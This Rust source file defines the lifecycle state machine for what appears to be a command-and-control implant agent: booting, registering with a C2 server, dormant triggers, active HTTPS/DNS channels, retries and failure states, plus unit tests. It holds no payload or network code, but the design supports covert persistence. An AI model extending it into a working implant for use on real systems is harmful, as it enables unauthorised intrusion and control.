//! Agent state machine for managing lifecycle and transitions.

use std::time::{Duration, Instant};
use crate::common::ChannelType;

/// Agent lifecycle states
#[derive(Debug, Clone)]
pub enum AgentState {
    /// Dormant state - waiting for trigger
    Dormant {
        trigger: DormantTrigger,
        timeout: Duration,
        last_wake: Option<Instant>,
    },
    /// Initial boot phase
    Booting,
    /// Registering with C2 server
    Registering {
        attempt: u32,
        max_attempts: u32,
    },
    /// Active and communicating
    Active {
        last_contact: Instant,
        task_count: usize,
        channel_id: ChannelType,
    },
    /// Retrying after failure
    Retrying {
        attempt: u32,
        next_channel: Option<ChannelType>,
        backoff: Duration,
    },
    /// Failed state
    Failed {
        reason: FailureReason,
        timestamp: Instant,
    },
}

/// Triggers for waking from dormant state
#[derive(Debug, Clone)]
pub enum DormantTrigger {
    /// Watch for file changes
    FileWatch {
        path: String,
        pattern: String,
    },
    /// Network event (domain resolution, connection)
    NetworkEvent {
        interface: String,
        domain: String,
    },
    /// Process start detection
    ProcessStart {
        name: String,
    },
    /// Time-based (cron-like schedule)
    TimeBased {
        schedule: String, // Cron expression
    },
    /// Manual signal
    Manual {
        signal: String,
    },
}

/// Reasons for agent failure
#[derive(Debug, Clone)]
pub enum FailureReason {
    /// All channels exhausted
    AllChannelsFailed,
    /// Authentication failure
    AuthenticationFailed,
    /// Decryption error
    DecryptionError,
    /// Timeout waiting for response
    Timeout,
    /// Maximum retries exceeded
    MaxRetriesExceeded,
    /// Configuration error
    ConfigurationError(String),
}

/// State machine for managing agent lifecycle
pub struct StateMachine {
    current_state: AgentState,
    transition_count: u64,
    created_at: Instant,
}

impl StateMachine {
    /// Create new state machine in booting state
    pub fn new() -> Self {
        Self {
            current_state: AgentState::Booting,
            transition_count: 0,
            created_at: Instant::now(),
        }
    }

    /// Create state machine in dormant state
    pub fn dormant(trigger: DormantTrigger, timeout: Duration) -> Self {
        Self {
            current_state: AgentState::Dormant {
                trigger,
                timeout,
                last_wake: None,
            },
            transition_count: 0,
            created_at: Instant::now(),
        }
    }

    /// Get current state
    pub fn state(&self) -> &AgentState {
        &self.current_state
    }

    /// Check if agent is active
    pub fn is_active(&self) -> bool {
        matches!(self.current_state, AgentState::Active { .. })
    }

    /// Check if agent is dormant
    pub fn is_dormant(&self) -> bool {
        matches!(self.current_state, AgentState::Dormant { .. })
    }

    /// Transition to active state
    pub fn transition_to_active(&mut self, channel: ChannelType) {
        self.current_state = AgentState::Active {
            last_contact: Instant::now(),
            task_count: 0,
            channel_id: channel,
        };
        self.transition_count += 1;
    }

    /// Transition to registering state
    pub fn transition_to_registering(&mut self, max_attempts: u32) {
        self.current_state = AgentState::Registering {
            attempt: 1,
            max_attempts,
        };
        self.transition_count += 1;
    }

    /// Increment registration attempt
    pub fn increment_registration_attempt(&mut self) -> bool {
        if let AgentState::Registering { attempt, max_attempts } = &mut self.current_state {
            *attempt += 1;
            *attempt <= *max_attempts
        } else {
            false
        }
    }

    /// Transition to retrying state
    pub fn transition_to_retrying(&mut self, attempt: u32, backoff: Duration) {
        self.current_state = AgentState::Retrying {
            attempt,
            next_channel: None,
            backoff,
        };
        self.transition_count += 1;
    }

    /// Transition to failed state
    pub fn transition_to_failed(&mut self, reason: FailureReason) {
        self.current_state = AgentState::Failed {
            reason,
            timestamp: Instant::now(),
        };
        self.transition_count += 1;
    }

    /// Wake from dormant state
    pub fn wake(&mut self) {
        if let AgentState::Dormant { last_wake, .. } = &mut self.current_state {
            *last_wake = Some(Instant::now());
            self.current_state = AgentState::Booting;
            self.transition_count += 1;
        }
    }

    /// Update active state after successful contact
    pub fn update_active(&mut self, task_count: usize, channel: ChannelType) {
        if let AgentState::Active { .. } = &self.current_state {
            self.current_state = AgentState::Active {
                last_contact: Instant::now(),
                task_count,
                channel_id: channel,
            };
        }
    }

    /// Get time since last contact (if active)
    pub fn time_since_contact(&self) -> Option<Duration> {
        if let AgentState::Active { last_contact, .. } = &self.current_state {
            Some(last_contact.elapsed())
        } else {
            None
        }
    }

    /// Get uptime
    pub fn uptime(&self) -> Duration {
        self.created_at.elapsed()
    }

    /// Get transition count
    pub fn transition_count(&self) -> u64 {
        self.transition_count
    }
}

impl Default for StateMachine {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_state_transitions() {
        let mut sm = StateMachine::new();
        assert!(matches!(sm.state(), AgentState::Booting));

        sm.transition_to_registering(3);
        assert!(matches!(sm.state(), AgentState::Registering { .. }));

        sm.transition_to_active(ChannelType::Https);
        assert!(sm.is_active());

        sm.update_active(5, ChannelType::Dns);
        if let AgentState::Active { task_count, channel_id, .. } = sm.state() {
            assert_eq!(*task_count, 5);
            assert_eq!(*channel_id, ChannelType::Dns);
        }
    }

    #[test]
    fn test_dormant_state() {
        let trigger = DormantTrigger::Manual {
            signal: "wake".to_string(),
        };
        let mut sm = StateMachine::dormant(trigger, Duration::from_secs(3600));

        assert!(sm.is_dormant());
        sm.wake();
        assert!(!sm.is_dormant());
    }
}
